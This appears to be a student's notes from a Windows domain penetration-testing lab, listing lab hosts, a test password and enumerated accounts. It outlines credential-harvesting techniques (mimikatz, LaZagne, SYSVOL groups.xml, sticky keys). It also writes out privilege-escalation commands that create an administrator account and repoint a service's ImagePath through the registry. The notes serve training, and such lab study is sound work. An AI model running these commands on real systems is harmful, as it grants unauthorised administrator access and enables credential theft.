# NETWORK
DOMAIN:
- NetBIOS: CSTLAB
- DNS: CSTLAB.local

192.168.56.110 - admin PC
- NetBIOS: ADMINPC
- DNS: AdminPC

192.168.56.150 - DC - NS - Kerberos - LDAP
- NetBIOS: CSTLABDC
- DNS: CSTLABDC

192.168.56.160 - INITIAL HOST
- NetBIOS: CSTLABLOWPRIV
- DNS: CSTLABLOWPRIV

|NetBIOS name|DNS name|Display name|Password|Privs|
|-|-|-|-|-|
|lowpriv?|lowpriv?|John Doe|L3tm3!n|x|

DAY 1:
```
* boot the system from an ISO, do "sticky keys" attack 
* check the registry for passwords (autologon)
* extract password from the credential manager (requires Nirsoft/mimikatz/LaZagne)
* check sysvol share (groups.xml) - (requires a decryptor, thanks Microsoft for publishing the key!)
* on some systems c:\windows\panther\unattend.xml - base64 encoded password (although in our lab, recent updates have removed this)
```

DAY 2:
```
* UNQ Service - Unquoted service path
* HJ DLL Service - DLL hijacking
* IS Registry Service - Insecure registery
* FP Service - ?
* DMT Service - ?
```

IS Registry Service - Insecure registry:
```
Computer\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\registrysvc
C:\Program Files\IS Registry Service\isregsvc.exe

change permissions folder
change 'start' to 2

net user user_ir Password1! /add
net localgroup Administrators user_ir /add

reg add "Computer\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\registrysvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\lowpriv.CSTLAB\Desktop\test\test.exe" /f
```

# REMOTE
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[lowpriv] rid:[0x450]
user:[tomadmin] rid:[0x451]

# LOCAL